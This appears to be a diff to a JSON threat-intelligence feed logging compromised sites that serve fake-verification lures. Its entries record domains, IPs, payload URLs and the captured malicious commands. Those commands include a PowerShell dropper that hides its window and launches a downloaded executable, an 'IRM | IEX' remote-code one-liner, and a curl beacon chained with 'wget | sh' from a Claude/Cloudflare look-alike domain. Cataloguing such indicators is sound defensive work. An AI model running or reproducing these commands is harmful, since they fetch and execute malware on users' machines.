@@ -1,5 +1,44 @@
 [
   {
+    "UrlDomain": "phoenixhomme.com",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "172.67.220.80"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwrbifoz2i5h0omlmy0vlkor",
+    "ScannedAt": "2026-11-22T04:09:27.365000+00:00"
+  },
+  {
+    "UrlDomain": "adrenalinaclub.com.br",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "108.167.188.232"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677"
+    ],
+    "ReportId": "cmwrbhefp2hzv0omlbe37fsqt",
+    "ScannedAt": "2026-11-22T04:08:39.055000+00:00"
+  },
+  {
     "UrlDomain": "healtybeautycare.com",
     "DeliveryUrl": [
       "thesense.ink",
@@ -11436,30 +11475,5 @@
     ],
     "ReportId": "cmwhdrkmr0skk0omlnjzy4s28",
     "ScannedAt": "2026-11-15T05:14:51.096000+00:00"
-  },
-  {
-    "UrlDomain": "conferenciahertz.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "claude-flare-verification.vercel.app"
-    ],
-    "PayloadUrl": [
-      "https://claude-flare-verification.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/win",
-      "https://claude-flare-verification.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.156"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=69e0a4a8-9f08-4dce-8d93-b961c0037dfd&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fconferenciahertz[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-15T04%3A00%3A19.375Z&lastShellAt=2026-11-15T04%3A00%3A19.375Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://claude-flare-verification[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://claude-flare-verification.vercel.app/lin"
-    ],
-    "ReportId": "cmwhb5rpu0ryt0omlc0rks6ff",
-    "ScannedAt": "2026-11-15T04:01:54.634000+00:00"
   }
 ]
